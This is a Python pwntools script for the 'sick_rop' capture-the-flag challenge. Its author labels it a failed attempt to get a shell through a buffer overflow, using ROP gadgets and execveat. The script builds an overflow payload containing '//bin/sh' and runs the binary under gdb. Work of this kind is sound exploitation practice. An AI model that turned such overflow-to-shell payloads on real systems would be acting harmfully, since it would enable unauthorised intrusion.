from pwn import *
import time

# Failed attempt at solving challenge with ROP & execveat()

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./sick_rop")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = remote("1.2.3.4", 30246)
#p = process("./sick_rop")
p = gdb.debug("./sick_rop", '''
break *_start
break *vuln+32
''')

# mov rdx, qword ptr [rsp + 0x10] ; syscall
rdx = 0x000000000040100f
esi_rdx = 0x000000000040100b
binsh = "\x2f\x2f\x62\x69\x6e\x2f\x73\x68"


# execveat(1, '/bin/sh',0,0,0)
# Need r10 = 0x0 for flag :(
payload = ""
payload += binsh                  # Writes to RSI
payload += "\x00" * (40 - 8) 
payload += p64(rdx)
payload += "\x00" * 273           # Writes to RDX

p.sendline(payload)
p.interactive()
